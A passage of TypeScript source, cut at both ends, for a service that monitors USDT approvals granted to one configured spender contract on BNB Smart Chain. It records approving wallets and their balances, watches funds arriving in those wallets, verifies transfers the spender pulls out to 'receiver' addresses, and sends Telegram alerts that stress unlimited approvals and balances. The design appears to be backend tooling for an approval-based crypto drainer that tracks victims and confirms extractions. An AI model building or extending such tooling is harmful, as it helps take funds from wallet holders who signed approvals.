            await this.store.updateApprovalCanonicalStatus(record.id, "canonical");
          } else {
            await this.store.updateIncomingCanonicalStatus(record.id, "canonical");
          }
          changed = true;
        }
        continue;
      }
      if (record.canonicalStatus === "reorged") continue;
      if ("approvalAmount" in record) {
        await this.store.updateApprovalCanonicalStatus(record.id, "reorged");
      } else {
        await this.store.updateIncomingCanonicalStatus(record.id, "reorged");
      }
      changed = true;
      console.warn(`[Monitor] Marked reorged event ${record.transactionHash}:${record.logIndex}`);
    }
    if (changed) await this.recoverApprovalLinkedWallets();
  }

  private async scanBlockchainEvents(latestBlock: number) {
    if (!this.running) return;
    const state = this.store.getMonitoringState("Approval+Transfer");
    const stateMatchesConfiguration =
      state.contractAddress.toLowerCase() === config.USDT_ADDRESS.toLowerCase() &&
      state.chainId === config.CHAIN_ID;
    const lastProcessedBlock = stateMatchesConfiguration
      ? state.lastProcessedBlock
      : config.MONITOR_START_BLOCK - 1;
    const start = Math.max(
      lastProcessedBlock - REORG_LOOKBACK_BLOCKS + 1,
      config.MONITOR_START_BLOCK
    );
    if (start > latestBlock) return;

    const approvalTopic = this.eventInterface.getEvent("Approval")!.topicHash;
    const transferTopic = this.eventInterface.getEvent("Transfer")!.topicHash;
    const executionTopic = this.eventInterface.getEvent("TransferExecuted")!.topicHash;
    const spenderTopic = ethers.zeroPadValue(config.ALLOWANCE_SPENDER_ADDRESS, 32);
    const maxRange = 50;
    for (let from = start; from <= latestBlock; from += maxRange) {
      const to = Math.min(from + maxRange - 1, latestBlock);
      const rangeStartedAt = Date.now();
      try {
        const approvalLogs = await this.getLogsWithRangeFallback({
          address: config.USDT_ADDRESS,
          topics: [approvalTopic, null, spenderTopic]
        }, from, to);

        for (const log of approvalLogs) await this.processApprovalLog(log);

        const monitoredAddresses = this.store.listApprovalLinkedWallets().map((wallet) => wallet.address);
        const incomingCandidates = new Set(monitoredAddresses.map((wallet) => wallet.toLowerCase()));
        for (const log of approvalLogs) {
          const parsed = this.eventInterface.parseLog(log);
          if (parsed?.name === "Approval") incomingCandidates.add(String(parsed.args.owner).toLowerCase());
        }

        if (monitoredAddresses.length > 0) {
          const executionLogs = await this.getLogsWithRangeFallback({
            address: config.ALLOWANCE_SPENDER_ADDRESS,
            topics: [executionTopic]
          }, from, to);
          for (let index = 0; index < monitoredAddresses.length; index += 100) {
            const walletTopics = monitoredAddresses
              .slice(index, index + 100)
              .map((walletAddress) => ethers.zeroPadValue(walletAddress, 32));
            const transferLogs = await this.getLogsWithRangeFallback({
              address: config.USDT_ADDRESS,
              topics: [transferTopic, walletTopics]
            }, from, to);
            for (const log of transferLogs) {
              await this.processTransferLog(log, executionLogs);
            }
          }
        }

        const incomingAddresses = [...incomingCandidates];
        for (let index = 0; index < incomingAddresses.length; index += 100) {
          const walletTopics = incomingAddresses
            .slice(index, index + 100)
            .map((walletAddress) => ethers.zeroPadValue(walletAddress, 32));
          const incomingLogs = await this.getLogsWithRangeFallback({
            address: config.USDT_ADDRESS,
            topics: [transferTopic, null, walletTopics]
          }, from, to);
          for (const log of incomingLogs) await this.processIncomingTransferLog(log);
        }

        await this.reconcileRecentReorgs(from, to);
        await this.store.updateConfirmationStatus(latestBlock, APPROVAL_CONFIRMATION_THRESHOLD);
        await this.store.setMonitoringState({
          network: config.NETWORK_NAME,
          chainId: config.CHAIN_ID,
          contractAddress: config.USDT_ADDRESS,
          eventType: "Approval+Transfer",
          lastProcessedBlock: to,
          updatedAt: new Date().toISOString()
        });
      } finally {
        console.log(
          `[Monitor] latest=${this.latestObservedBlock} start=${from} end=${to} ` +
          `duration=${Date.now() - rangeStartedAt}ms lag=${Math.max(0, this.latestObservedBlock - to)}`
        );
      }
    }
    this.scheduleApprovalLinkedWalletBalanceRefresh();
  }

  private hasPriorGrant(owner: string, blockNumber: number, logIndex: number) {
    const priorApprovals = this.store.listApprovalEvents()
      .filter((approval) => {
        const sameOwner = (approval.walletAddress || approval.ownerAddress).toLowerCase() === owner.toLowerCase();
        return sameOwner &&
            approval.canonicalStatus !== "reorged" &&
            (approval.blockNumber < blockNumber ||
            (approval.blockNumber === blockNumber && approval.logIndex < logIndex));
      })
      .sort((first, second) =>
        first.blockNumber - second.blockNumber || first.logIndex - second.logIndex
      );
    const previousApproval = priorApprovals[priorApprovals.length - 1];
    return previousApproval !== undefined &&
      /^\d+$/.test(previousApproval.rawApprovalAmount) &&
      BigInt(previousApproval.rawApprovalAmount) > 0n;
  }

  private isRevocationEligible(approval: ApprovalRecord) {
    return approval.revocationEligible ??
      this.hasPriorGrant(approval.ownerAddress, approval.blockNumber, approval.logIndex);
  }

  private async processApprovalLog(log: ethers.Log) {
    if (log.address.toLowerCase() !== config.USDT_ADDRESS.toLowerCase()) return;
    const parsed = this.eventInterface.parseLog(log);
    if (!parsed || parsed.name !== "Approval") return;
    const owner = String(parsed.args[0]);
    const spender = String(parsed.args[1]);
    const value = parsed.args[2] as bigint;
    if (spender.toLowerCase() !== config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase()) return;
    if (!(await this.verifySuccessfulEventReceipt(log))) return;

    const eventId = `approval-${config.CHAIN_ID}-${config.USDT_ADDRESS.toLowerCase()}-${log.transactionHash.toLowerCase()}-${log.index}`;
    const existing = await this.store.findApprovalEvent(String(config.CHAIN_ID), log.transactionHash, Number(log.index));
    if (existing) {
      const currentBlock = await this.provider.getBlock(Number(log.blockNumber));
      const confirmations = Math.max(0, this.latestObservedBlock - Number(log.blockNumber) + 1);
      const refreshed: ApprovalRecord = {
        ...existing,
        blockHash: log.blockHash,
        canonicalStatus: "canonical",
        confirmations,
        confirmationStatus: confirmations >= APPROVAL_CONFIRMATION_THRESHOLD ? "confirmed" : "pending",
        updatedAt: new Date().toISOString()
      };
      if (!currentBlock?.hash || currentBlock.hash.toLowerCase() !== log.blockHash.toLowerCase()) return;
      await this.store.upsertApproval(refreshed);
      const prepared = refreshed.telegramStatus === "sent"
        ? refreshed
        : await this.prepareApprovalNotification(refreshed);
      await this.linkApprovalWallet(prepared, false);
      await this.sendTelegramNotification("Approval", prepared);
      return;
    }

    const now = new Date().toISOString();
    const blockTimestamp = await this.getBlockTimestamp(Number(log.blockNumber));
    const approvalState = value === 0n
      ? {
          currentAllowance: "0",
          rawCurrentAllowance: "0",
          allowanceStatus: "Verified by zero-value Approval event",
          walletBalance: undefined,
          rawWalletBalance: undefined,
          balanceStatus: "Not queried for revocation"
        }
      : await this.getApprovalState(owner, Number(log.blockNumber));
    const previousAllowance = value === 0n
      ? await this.getPreviousAllowance(owner, Number(log.blockNumber))
      : {};
    const revocationEligible = value === 0n
      ? this.hasPriorGrant(owner, Number(log.blockNumber), Number(log.index))
      : undefined;
    const record: ApprovalRecord = {
      id: eventId,
      walletAddress: owner,
      ownerAddress: owner,
      spender,
      tokenContract: config.USDT_ADDRESS,
      tokenSymbol: this.tokenSymbol,
      tokenDecimals: this.tokenDecimals,
      approvalAmount: ethers.formatUnits(value, this.tokenDecimals),
      rawApprovalAmount: value.toString(),
      ...approvalState,
      ...previousAllowance,
      revocationEligible,
      network: config.NETWORK_NAME,
      chainId: String(config.CHAIN_ID),
      blockNumber: Number(log.blockNumber),
      blockHash: log.blockHash,
      blockTimestamp: blockTimestamp.timestamp,
      blockTimestampStatus: blockTimestamp.status,
      transactionHash: log.transactionHash,
      logIndex: Number(log.index),
      eventType: "Approval",
      processingStatus: "processed",
      approvalStatus: value > 0n ? "active" : "revoked",
      canonicalStatus: "canonical",
      confirmations: Math.max(0, this.latestObservedBlock - Number(log.blockNumber) + 1),
      confirmationStatus: this.latestObservedBlock - Number(log.blockNumber) + 1 >= APPROVAL_CONFIRMATION_THRESHOLD
        ? "confirmed"
        : "pending",
      telegramStatus: value === 0n && !this.hasPriorGrant(owner, Number(log.blockNumber), Number(log.index))
        ? "skipped"
        : "pending",
      telegramAttemptCount: 0,
      createdAt: now,
      updatedAt: now
    };

    await this.store.upsertApproval(record);
    await this.linkApprovalWallet(record, true);
    await this.sendTelegramNotification("Approval", record);
  }

  private async linkApprovalWallet(approval: ApprovalRecord, reactivate: boolean) {
    const existing = this.store.getWallet(approval.walletAddress);
    const now = new Date().toISOString();
    if (approval.rawApprovalAmount === "0") {
      if (existing) {
        await this.store.update(approval.walletAddress, {
          approvalLinked: false,
          currentAllowance: "0",
          rawCurrentAllowance: "0",
          spender: config.ALLOWANCE_SPENDER_ADDRESS,
          tokenContract: config.USDT_ADDRESS,
          chainId: String(config.CHAIN_ID),
          latestApprovalTxHash: approval.transactionHash,
          latestActivityAt: approval.blockTimestamp,
          updatedAt: now
        });
      }
      return;
    }
    const wallet: WalletRecord = {
      ...existing,
      address: approval.walletAddress,
      receiver: existing?.receiver ?? 1,
      active: reactivate ? true : existing?.active ?? true,
      createdAt: existing?.createdAt ?? now,
      approvalLinked: true,
      tokenContract: config.USDT_ADDRESS,
      tokenSymbol: approval.tokenSymbol,
      tokenDecimals: this.tokenDecimals,
      network: config.NETWORK_NAME,
      chainId: approval.chainId,
      currentAllowance: approval.currentAllowance,
      rawCurrentAllowance: approval.rawCurrentAllowance,
      currentBalance: approval.walletBalance,
      rawCurrentBalance: approval.rawWalletBalance,
      spender: config.ALLOWANCE_SPENDER_ADDRESS,
      firstDetectedAt: existing?.firstDetectedAt ?? approval.createdAt,
      latestApprovalTxHash: approval.transactionHash,
      latestActivityAt: approval.blockTimestamp,
      updatedAt: now
    };
    await this.store.register(wallet);
  }

  private async verifyTransferExecution(
    transferLog: ethers.Log,
    from: string,
    to: string,
    amount: bigint,
    executionLogs: ethers.Log[]
  ): Promise<{
    method?: "executeToReceiver1" | "executeToReceiver2";
    eventLogIndex: number;
  } | undefined> {
    const receipt = await this.getReceipt(transferLog);
    const executionLog = executionLogs.find((candidate) => {
      if (
        candidate.address.toLowerCase() !== config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() ||
        candidate.transactionHash.toLowerCase() !== transferLog.transactionHash.toLowerCase() ||
        candidate.blockNumber !== transferLog.blockNumber ||
        candidate.index <= transferLog.index ||
        !this.receiptContainsLog(receipt, candidate)
      ) return false;
      const parsed = this.eventInterface.parseLog(candidate);
      const matchesExecutedTransfer = parsed?.name === "TransferExecuted" &&
        String(parsed.args.wallet).toLowerCase() === from.toLowerCase() &&
        String(parsed.args.receiver).toLowerCase() === to.toLowerCase() &&
        parsed.args.amount === amount;
      if (!matchesExecutedTransfer) return false;
      return !receipt.logs.some((receiptLog) => {
        if (
          receiptLog.index <= transferLog.index ||
          receiptLog.index >= candidate.index ||
          receiptLog.address.toLowerCase() !== config.USDT_ADDRESS.toLowerCase()
        ) return false;
        const intervening = this.eventInterface.parseLog(receiptLog);
        return intervening?.name === "Transfer" &&
          String(intervening.args.from).toLowerCase() === from.toLowerCase() &&
          String(intervening.args.to).toLowerCase() === to.toLowerCase() &&
          intervening.args.value === amount;
      });
    });
    if (!executionLog) return undefined;

    const transaction = await this.provider.getTransaction(transferLog.transactionHash);
    if (!transaction) {
      throw new Error(`Transaction data unavailable for verified spender event ${transferLog.transactionHash}`);
    }
    if (transaction.to?.toLowerCase() !== config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase()) {
      return { eventLogIndex: Number(executionLog.index) };
    }
    try {
      const parsedCall = new ethers.Interface(ABI).parseTransaction({
        data: transaction.data,
        value: transaction.value
      });
      if (
        !parsedCall ||
        (parsedCall.name !== "executeToReceiver1" && parsedCall.name !== "executeToReceiver2") ||
        String(parsedCall.args.wallet).toLowerCase() !== from.toLowerCase() ||
        parsedCall.args.amount !== amount
      ) return undefined;
      return { method: parsedCall.name, eventLogIndex: Number(executionLog.index) };
    } catch (error) {
      console.warn(`[Monitor] Configured-spender calldata could not be decoded: ${sanitizeRpcError(error)}`);
      return undefined;
    }
  }

  private async getIncomingBalanceTimeline(wallet: string, blockNumber: number, expectedBlockHash: string) {
    const cacheKey = `${wallet.toLowerCase()}:${blockNumber}:${expectedBlockHash.toLowerCase()}`;
    const cached = this.incomingBalanceTimelineCache.get(cacheKey);
    if (cached) return cached;

    const timeline = (async () => {
      try {
        if (blockNumber <= 0) throw new Error("Historical balance before block zero is unavailable");
        const walletTopic = ethers.zeroPadValue(wallet, 32);
        const transferTopic = this.eventInterface.getEvent("Transfer")!.topicHash;
        const [outgoingLogs, incomingLogs, block] = await Promise.all([
          this.getLogsWithRangeFallback({
            address: config.USDT_ADDRESS,
            topics: [transferTopic, walletTopic]
          }, blockNumber, blockNumber),
          this.getLogsWithRangeFallback({
            address: config.USDT_ADDRESS,
            topics: [transferTopic, null, walletTopic]
          }, blockNumber, blockNumber),
          this.provider.getBlock(blockNumber)
        ]);
        if (!block?.hash) throw new Error(`Block ${blockNumber} is unavailable`);
        if (block.hash.toLowerCase() !== expectedBlockHash.toLowerCase()) {
          throw new Error(`Block ${blockNumber} changed while reconstructing wallet balance`);
        }

        const logsByKey = new Map<string, ethers.Log>();
        for (const log of [...outgoingLogs, ...incomingLogs]) {
          if (log.blockHash.toLowerCase() !== block.hash.toLowerCase()) {
            throw new Error(`Transfer log block hash mismatch at block ${blockNumber}`);
          }
          logsByKey.set(`${log.transactionHash.toLowerCase()}:${log.index}`, log);
        }
        const logs = [...logsByKey.values()];
        const historicalErrors: string[] = [];

        for (const [source, provider] of [
          ["primary RPC", this.primaryProvider],
          ["fallback RPC", this.fallbackProvider]
        ] as const) {
          try {
            const token = new ethers.Contract(config.USDT_ADDRESS, ERC20_ABI, provider);
            const balanceBeforeBlock = await token.balanceOf(wallet, { blockTag: blockNumber - 1 }) as bigint;
            const expectedEndBalance = await token.balanceOf(wallet, { blockTag: blockNumber }) as bigint;
            const result = new Map<string, HistoricalBalanceSnapshot>();
            const parsedLogs = logs.map((log) => {
              const parsed = this.eventInterface.parseLog(log);
              if (!parsed || parsed.name !== "Transfer") throw new Error("Unrecognized USDT Transfer log");
              return {
                key: `${log.transactionHash.toLowerCase()}:${log.index}`,
                transactionIndex: log.transactionIndex,
                logIndex: log.index,
                from: String(parsed.args.from),
                to: String(parsed.args.to),
                amount: parsed.args.value as bigint
              };
            });
            const reconstructed = reconstructWalletBalanceTimeline(
              wallet,
              balanceBeforeBlock,
              parsedLogs,
              expectedEndBalance
            );
            for (const [eventKey, balances] of reconstructed) {
              result.set(eventKey, {
                before: ethers.formatUnits(balances.before, this.tokenDecimals),
                after: ethers.formatUnits(balances.after, this.tokenDecimals),
                rawBefore: balances.before.toString(),
                rawAfter: balances.after.toString(),
                status: `Verified by transaction-log reconstruction and block ${blockNumber} historical state (${source})`
              });
            }
            return result;
          } catch (error) {
            const detail = sanitizeRpcError(error);
            historicalErrors.push(`${source}: ${detail}`);
            console.error(
              `[Monitor] Historical incoming USDT balance reconstruction failed for ${wallet} at block ${blockNumber} (${source}): ${detail}`
            );
          }
        }

        return new Map<string, HistoricalBalanceSnapshot>([
          ["__error", {
            status: `Unavailable; historical balance reconstruction failed: ${historicalErrors.join("; ")}`
          }]
        ]);
      } catch (error) {
        const detail = sanitizeRpcError(error);
        console.error(
          `[Monitor] Incoming USDT balance history unavailable for ${wallet} at block ${blockNumber}: ${detail}`
        );
        return new Map<string, HistoricalBalanceSnapshot>([
          ["__error", { status: `Unavailable; ${detail}` }]
        ]);
      }
    })();

    this.incomingBalanceTimelineCache.set(cacheKey, timeline);
    void timeline.then((result) => {
      if (result.has("__error") && this.incomingBalanceTimelineCache.get(cacheKey) === timeline) {
        this.incomingBalanceTimelineCache.delete(cacheKey);
      }
    });
    if (this.incomingBalanceTimelineCache.size > 1000) {
      const oldestKey = this.incomingBalanceTimelineCache.keys().next().value;
      if (oldestKey !== undefined) this.incomingBalanceTimelineCache.delete(oldestKey);
    }
    return timeline;
  }

  private async processIncomingTransferLog(log: ethers.Log) {
    if (log.address.toLowerCase() !== config.USDT_ADDRESS.toLowerCase()) return;
    const parsed = this.eventInterface.parseLog(log);
    if (!parsed || parsed.name !== "Transfer") return;
    const sender = String(parsed.args.from);
    const walletAddress = String(parsed.args.to);
    const value = parsed.args.value as bigint;
    const approval = this.store.findActiveApprovalAt(
      walletAddress,
      Number(log.blockNumber),
      Number(log.index)
    );
    if (!approval || this.store.getWallet(walletAddress)?.active !== true ||
      !(await this.verifySuccessfulEventReceipt(log))) return;
    const block = await this.provider.getBlock(Number(log.blockNumber));
    if (!block?.hash || block.hash.toLowerCase() !== log.blockHash.toLowerCase()) return;

    const transactionHash = log.transactionHash.toLowerCase();
    const logIndex = Number(log.index);
    const id = `incoming-${config.CHAIN_ID}-${config.USDT_ADDRESS.toLowerCase()}-${transactionHash}-${logIndex}`;
    const existing = await this.store.findIncomingTransferEvent(String(config.CHAIN_ID), transactionHash, logIndex);
    const snapshots = await this.getIncomingBalanceTimeline(walletAddress, Number(log.blockNumber), log.blockHash);
    const snapshot = snapshots.get(`${transactionHash}:${log.index}`) ?? snapshots.get("__error");
    const timestamp = await this.getBlockTimestamp(Number(log.blockNumber));
    const confirmations = Math.max(0, this.latestObservedBlock - Number(log.blockNumber) + 1);
    const now = new Date().toISOString();
    const record: IncomingTransferRecord = {
      id,
      walletAddress,
      sender,
      receivedAmount: ethers.formatUnits(value, this.tokenDecimals),
      rawReceivedAmount: value.toString(),
      tokenContract: config.USDT_ADDRESS,
      tokenSymbol: this.tokenSymbol,
      tokenDecimals: this.tokenDecimals,
      spender: config.ALLOWANCE_SPENDER_ADDRESS,
      approvalRecordId: approval.id,
      approvalTransactionHash: approval.transactionHash,
      approvalBlockNumber: approval.blockNumber,
      approvalBlockTimestamp: approval.blockTimestamp,
      approvedAllowance: approval.approvalAmount,
      rawApprovedAllowance: approval.rawApprovalAmount,
      balanceBefore: snapshot?.before,
      rawBalanceBefore: snapshot?.rawBefore,
      balanceAfter: snapshot?.after,
      rawBalanceAfter: snapshot?.rawAfter,
      balanceStatus: snapshot?.status ?? "Unavailable; target transfer was absent from reconstructed block logs",
      network: config.NETWORK_NAME,
      chainId: String(config.CHAIN_ID),
      blockNumber: Number(log.blockNumber),
      blockHash: log.blockHash,
      transactionIndex: log.transactionIndex,
      blockTimestamp: timestamp.timestamp,
      blockTimestampStatus: timestamp.status,
      transactionHash: log.transactionHash,
      logIndex,
      eventType: "IncomingTransfer",
      processingStatus: "processed",
      canonicalStatus: "canonical",
      confirmationStatus: confirmations >= APPROVAL_CONFIRMATION_THRESHOLD ? "confirmed" : "pending",
      confirmations,
      telegramStatus: existing?.telegramStatus ?? "pending",
      telegramAttemptCount: existing?.telegramAttemptCount ?? 0,
      telegramSentAt: existing?.telegramSentAt,
      telegramError: existing?.telegramError,
      createdAt: existing?.createdAt ?? now,
      updatedAt: now
    };

    await this.store.upsertIncomingTransfer(record);
    const wallet = this.store.getWallet(walletAddress);
    if (wallet) {
      await this.store.update(walletAddress, {
        latestTransferTxHash: log.transactionHash,
        latestActivityAt: timestamp.timestamp || wallet.latestActivityAt,
        updatedAt: now
      });
    }
    await this.sendIncomingTransferNotification(record);
  }

  private async processTransferLog(log: ethers.Log, executionLogs: ethers.Log[]) {
    if (log.address.toLowerCase() !== config.USDT_ADDRESS.toLowerCase()) return;
    const parsed = this.eventInterface.parseLog(log);
    if (!parsed || parsed.name !== "Transfer") return;
    if (!(await this.verifySuccessfulEventReceipt(log))) return;
    const from = String(parsed.args[0]);
    const to = String(parsed.args[1]);
    const value = parsed.args[2] as bigint;
    const monitoredWallets = new Set(this.store.listApprovalLinkedWallets().map((wallet) => wallet.address.toLowerCase()));
    if (!monitoredWallets.has(from.toLowerCase())) return;
    const execution = await this.verifyTransferExecution(log, from, to, value, executionLogs);
    if (!execution) return;

    const eventId = `transfer-${config.CHAIN_ID}-${config.USDT_ADDRESS.toLowerCase()}-${log.transactionHash.toLowerCase()}-${log.index}`;
    const existing = await this.store.findTransferEvent(String(config.CHAIN_ID), log.transactionHash, Number(log.index));
    if (existing) {
      await this.sendTelegramNotification("Transfer", existing);
      return;
    }

    const decimals = this.tokenDecimals;
    const symbol = this.tokenSymbol;
    const transferAmount = ethers.formatUnits(value, decimals);

    const now = new Date().toISOString();
    const blockTimestamp = await this.getBlockTimestamp(Number(log.blockNumber));
    const record: TransferRecord = {
      id: eventId,
      walletAddress: from,
      receivingWallet: to,
      sender: from,
      tokenContract: config.USDT_ADDRESS,
      tokenSymbol: symbol,
      tokenDecimals: decimals,
      transferAmount,
      rawTransferAmount: value.toString(),
      executionContract: config.ALLOWANCE_SPENDER_ADDRESS,
      executionEvidence: "TransferExecuted",
      executionEventLogIndex: execution.eventLogIndex,
      executionMethod: execution.method,
      executionVerified: true,
      network: config.NETWORK_NAME,
      chainId: String(config.CHAIN_ID),
      blockNumber: Number(log.blockNumber),
      blockTimestamp: blockTimestamp.timestamp,
      blockTimestampStatus: blockTimestamp.status,
      transactionHash: log.transactionHash,
      logIndex: Number(log.index),
      eventType: "Transfer",
      processingStatus: "processed",
      telegramStatus: "pending",
      telegramAttemptCount: 0,
      createdAt: now,
      updatedAt: now
    };

    await this.store.upsertTransfer(record);
    const walletAddress = to.toLowerCase();
    const pendingTransferIds = this.pendingTransferBalanceUpdates.get(walletAddress) ?? new Set<string>();
    pendingTransferIds.add(eventId);
    this.pendingTransferBalanceUpdates.set(walletAddress, pendingTransferIds);
    const wallet = this.store.getWallet(to);
    if (wallet) {
      await this.store.update(to, {
        tokenContract: config.USDT_ADDRESS,
        tokenSymbol: symbol,
        tokenDecimals: decimals,
        network: config.NETWORK_NAME,
        chainId: String(config.CHAIN_ID),
        latestTransferTxHash: log.transactionHash,
        latestActivityAt: record.blockTimestamp,
        updatedAt: record.updatedAt
      });
    }
    await this.sendTelegramNotification("Transfer", record);
  }

  private async sendTelegramNotification(type: "Approval" | "Transfer", record: ApprovalRecord | TransferRecord) {
    const current = record as ApprovalRecord | TransferRecord;
    const inScope = type === "Approval"
      ? current.eventType === "Approval" &&
        current.tokenContract.toLowerCase() === config.USDT_ADDRESS.toLowerCase() &&
        (current as ApprovalRecord).spender.toLowerCase() === config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() &&
        current.chainId === String(config.CHAIN_ID)
      : current.eventType === "Transfer" &&
        current.tokenContract.toLowerCase() === config.USDT_ADDRESS.toLowerCase() &&
        current.chainId === String(config.CHAIN_ID) &&
        (current as TransferRecord).executionVerified === true &&
        (current as TransferRecord).executionContract?.toLowerCase() === config.ALLOWANCE_SPENDER_ADDRESS.toLowerCase() &&
        (((current as TransferRecord).executionMethod === "executeToReceiver1" ||
          (current as TransferRecord).executionMethod === "executeToReceiver2") ||
          ((current as TransferRecord).executionEvidence === "TransferExecuted" &&
            Number.isInteger((current as TransferRecord).executionEventLogIndex)));
    if (!inScope) {
      console.error(`[Telegram] Refusing out-of-scope ${type.toLowerCase()} notification ${current.id}`);
      return;
    }
    const approval = type === "Approval" ? current as ApprovalRecord : undefined;
    const transfer = type === "Transfer" ? current as TransferRecord : undefined;
    if (!approval && !transfer) return;
    const revoked = approval?.rawApprovalAmount === "0";
    const deliveryKey = `${current.chainId}:${current.transactionHash.toLowerCase()}:${current.logIndex}:${type}`;
    if (current.telegramStatus === "sent" || this.telegramNotificationsInFlight.has(deliveryKey)) return;
    const alreadyDeliveredAt = this.successfulTelegramNotifications.get(deliveryKey);
    if (alreadyDeliveredAt) {
      current.telegramStatus = "sent";
      current.telegramSentAt = alreadyDeliveredAt;
      current.telegramError = undefined;
      current.updatedAt = new Date().toISOString();
      try {
        if (type === "Approval") await this.store.upsertApproval(current as ApprovalRecord);
        else await this.store.upsertTransfer(current as TransferRecord);
        this.successfulTelegramNotifications.delete(deliveryKey);
      } catch (error) {
        console.error(`[Telegram] Could not repair sent status for ${current.id}:`, error);
      }
      return;
    }
    if (
      approval &&
      revoked &&
      !this.isRevocationEligible(approval)
    ) {
      current.telegramStatus = "skipped";
      current.telegramError = NO_PRIOR_GRANT_ERROR;
      current.updatedAt = new Date().toISOString();
      try {
        await this.store.upsertApproval(approval);
      } catch (error) {
        console.error(`[Telegram] Could not persist non-revocation status for ${current.id}:`, error);
      }
      return;
    }
    if (!config.TELEGRAM_BOT_TOKEN || !config.TELEGRAM_CHAT_ID) {
      current.telegramStatus = "skipped";
      current.updatedAt = new Date().toISOString();
      console.warn(`[Telegram] ${type} notification ${current.id} skipped: bot token or chat ID is not configured`);
      try {
        if (type === "Approval") await this.store.upsertApproval(current as ApprovalRecord);
        else await this.store.upsertTransfer(current as TransferRecord);
      } catch (error) {
        console.error(`[Telegram] Could not persist skipped ${type.toLowerCase()} notification ${current.id}:`, error);
      }
      return;
    }

    this.telegramNotificationsInFlight.add(deliveryKey);
    const attempted = current.telegramAttemptCount + 1;
    const code = (value: string) => `<code>${escapeHtml(value)}</code>`;
    const walletLink = (value: string) =>
      `<a href="https://bscscan.com/address/${escapeHtml(encodeURIComponent(value))}">${code(value)}</a>`;
    const transactionLink = (value: string) =>
      `<a href="https://bscscan.com/tx/${escapeHtml(encodeURIComponent(value))}">${code(value)}</a>`;
    const divider = "━━━━━━━━━━━━━━━━━━━━";
    const previousAllowanceDisplay = approval?.rawPreviousAllowance === undefined
      ? approval?.previousAllowance === undefined
        ? "Unknown"
        : `${escapeHtml(formatAmount(approval.previousAllowance))} USDT`
      : BigInt(approval.rawPreviousAllowance) === MAX_UINT256
        ? "♾️ UNLIMITED"
        : `${escapeHtml(formatRawAmount(approval.rawPreviousAllowance, approval.tokenDecimals))} USDT`;
    const approvedAllowanceDisplay = approval && BigInt(approval.rawApprovalAmount) === MAX_UINT256
      ? "♾️ <b>APPROVED ALLOWANCE: UNLIMITED APPROVAL</b>"
      : approval
        ? `${escapeHtml(formatRawAmount(approval.rawApprovalAmount, approval.tokenDecimals))} USDT`
        : "";
    const currentAllowanceDisplay = approval?.rawCurrentAllowance === undefined
      ? "Unavailable"
      : BigInt(approval.rawCurrentAllowance) === MAX_UINT256
        ? "♾️ <b>CURRENT AVAILABLE ALLOWANCE: UNLIMITED</b>"
        : `${escapeHtml(formatRawAmount(approval.rawCurrentAllowance, approval.tokenDecimals))} USDT`;
    const text = approval
      ? [
          `<b>${revoked ? "🔴 USDT APPROVAL REVOKED" : "🟢 USDT APPROVAL DETECTED"}</b>`,
          divider,
          "👛 <b>WALLET INFORMATION</b>",
          `👤 Wallet Address:\n${walletLink(approval.walletAddress)}`,
          "🌐 Network:\nBNB Smart Chain (BEP-20)",
          "🪙 Token:\nTether USD (USDT)",
          `📄 Token Contract:\n${walletLink(config.USDT_ADDRESS)}`,
          divider,
          `🛡️ <b>${revoked ? "REVOCATION" : "APPROVAL"} INFORMATION</b>`,
          `🎯 ${revoked ? "Spender Contract" : "Approved Spender"}:\n${walletLink(config.ALLOWANCE_SPENDER_ADDRESS)}`,
          ...(revoked
            ? [
              `⛔ Previous Allowance:\n${approval.previousAllowance === undefined
                ? "Unknown"
                : `${previousAllowanceDisplay} (${formatStatus(approval.previousAllowanceStatus ?? "Historical value")})`}`,
                "🔒 New Available Allowance:\n0 USDT",
                "🚫 Revocation Type:\nFULL APPROVAL REVOCATION"
              ]
            : [
                `💰 Approved Allowance:\n${approvedAllowanceDisplay}`,
                `🔐 Current Available Allowance:\n${currentAllowanceDisplay}`,
                `ℹ️ Allowance Data:\n${formatStatus(approval.allowanceStatus ?? "Unavailable")}`
              ]),
          ...(revoked ? [] : [
            divider,
            "💵 <b>WALLET BALANCE INFORMATION</b>",
            `💳 Actual USDT Wallet Balance:\n${approval.rawWalletBalance === undefined ? "Unavailable" : `${escapeHtml(formatRawAmount(approval.rawWalletBalance, approval.tokenDecimals))} USDT`}`,
            `📊 Balance Status:\n${formatStatus(approval.balanceStatus ?? "Unavailable")}`
          ]),
          divider,
          "🔗 <b>BLOCKCHAIN TRANSACTION DETAILS</b>",
          `🧾 Transaction Hash:\n${transactionLink(approval.transactionHash)}`,
          `🔍 View Transaction:\n<a href="https://bscscan.com/tx/${escapeHtml(encodeURIComponent(approval.transactionHash))}">BscScan</a>`,
          `📦 Block Number:\n${escapeHtml(String(approval.blockNumber))}`,
          `⏰ Detection Time:\n${approval.blockTimestampStatus === "verified" ? formatTimestamp(approval.blockTimestamp) : "Unavailable"}`,
          divider,
          revoked ? "🔴 <b>STATUS: APPROVAL REVOKED</b>" : "☑ <b>STATUS: APPROVAL VERIFIED</b>"
        ].join("\n")
      : transfer ? [
          "<b>🔵 USDT TRANSFER DETECTED</b>",
          divider,
          "👛 <b>WALLET INFORMATION</b>",
          `👤 Monitored Wallet:\n${walletLink(transfer.walletAddress)}`,
          "🌐 Network:\nBNB Smart Chain (BEP-20)",
          "🪙 Token:\nTether USD (USDT)",
          divider,
          "💸 <b>TRANSFER INFORMATION</b>",
          `📤 From Wallet:\n${walletLink(transfer.sender)}`,
          `📥 To Wallet:\n${walletLink(transfer.receivingWallet)}`,
          `💰 Transfer Amount:\n${escapeHtml(formatRawAmount(transfer.rawTransferAmount, transfer.tokenDecimals))} USDT`,
          divider,
          "🛡️ <b>EXECUTION INFORMATION</b>",
          `🎯 Executing Allowance Spender:\n${walletLink(config.ALLOWANCE_SPENDER_ADDRESS)}`,
          `⚙️ Execution Verification:\nVERIFIED${transfer.executionMethod ? ` (${escapeHtml(transfer.executionMethod)})` : ""}`,
          "☑ Execution Status:\nSUCCESS",
          divider,
          "🔗 <b>BLOCKCHAIN TRANSACTION DETAILS</b>",
          `🧾 Transaction Hash:\n${transactionLink(transfer.transactionHash)}`,
          `🔍 View Transaction:\n<a href="https://bscscan.com/tx/${escapeHtml(encodeURIComponent(transfer.transactionHash))}">BscScan</a>`,
          `📦 Block Number:\n${escapeHtml(String(transfer.blockNumber))}`,
          `⏰ Detection Time:\n${transfer.blockTimestampStatus === "verified" ? formatTimestamp(transfer.blockTimestamp) : "Unavailable"}`,
          divider,
